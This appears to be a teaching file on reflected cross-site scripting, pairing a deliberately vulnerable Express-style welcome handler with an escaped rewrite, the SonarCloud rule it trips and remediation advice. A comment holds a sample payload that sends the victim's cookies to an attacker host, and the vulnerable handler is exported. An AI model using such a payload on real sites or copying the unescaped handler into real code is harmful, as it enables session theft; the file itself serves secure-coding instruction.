/**
 * SECURITY DEMO: Reflected Cross-Site Scripting (XSS)
 * 
 * Directory: src/security-demos/reflected_xss.js
 * Status: Isolated from live application path
 */

// ==========================================
// 1. VULNERABLE CODE (BEFORE)
// ==========================================
function renderWelcomePageVulnerable(req, res) {
  // DANGER: The query parameter 'username' is rendered directly back into the HTML response
  // without encoding or escaping. If an attacker tricks a user into clicking a link like:
  // http://localhost:3000/welcome?username=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
  // the script will execute in the victim's browser context, stealing sessions.
  const username = req.query.username;
  
  res.send(`<html><body><h1>Welcome, ${username}!</h1></body></html>`);
}

// ==========================================
// 2. SONARCLOUD RULE TRIPPED
// ==========================================
/*
 * Rule ID: javascript:S5131 (Endpoints should not be vulnerable to Cross-Site Scripting)
 * Severity: Critical / Blocker
 * 
 * Why it trips:
 * SonarCloud monitors the entry of untrusted request variables (query, body, params) and warns
 * if they are merged directly into response content HTML buffers without sanitization or HTML-entity 
 * encoding.
 */

// ==========================================
// 3. SECURE REWRITE (AFTER)
// ==========================================
function renderWelcomePageSecure(req, res) {
  const username = req.query.username || "Guest";

  // SECURE: HTML entity escape user input before printing it to the document body.
  // Special characters like <, >, &, ", ' are converted into secure HTML entities (&lt;, &gt;).
  const escapedUsername = escapeHtml(username);
  
  res.send(`<html><body><h1>Welcome, ${escapedUsername}!</h1></body></html>`);
}

// Helper utility for HTML entity escaping
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// ==========================================
// 4. REMEDIATION PRINCIPLE
// ==========================================
/*
 * Principle: Context-Aware Output Encoding.
 * 
 * All user input must be sanitized or encoded appropriate to the destination context 
 * (HTML Body, HTML Attribute, URL, JavaScript, CSS). Avoid dynamic HTML string concatenation.
 * Prefer using robust templating engines (such as EJS, Pug) or frameworks (React) that escape
 * variable bindings by default.
 */

module.exports = {
  renderWelcomePageVulnerable,
  renderWelcomePageSecure
};
